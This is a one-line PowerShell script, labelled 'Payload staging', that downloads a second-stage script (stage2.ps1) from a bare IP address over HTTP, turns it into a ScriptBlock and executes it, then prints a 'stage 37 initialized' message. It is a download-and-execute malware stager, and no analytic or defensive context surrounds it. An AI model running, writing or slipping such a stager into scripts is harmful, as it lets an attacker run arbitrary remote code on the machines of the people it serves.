
<# Payload staging #> $DownloadedScript = (iwr 'http://203.0.113.88/stage2.ps1' -UseBasicParsing).Content; [ScriptBlock]::Create($DownloadedScript).Invoke(); Write-Output "stage 37 initialized"
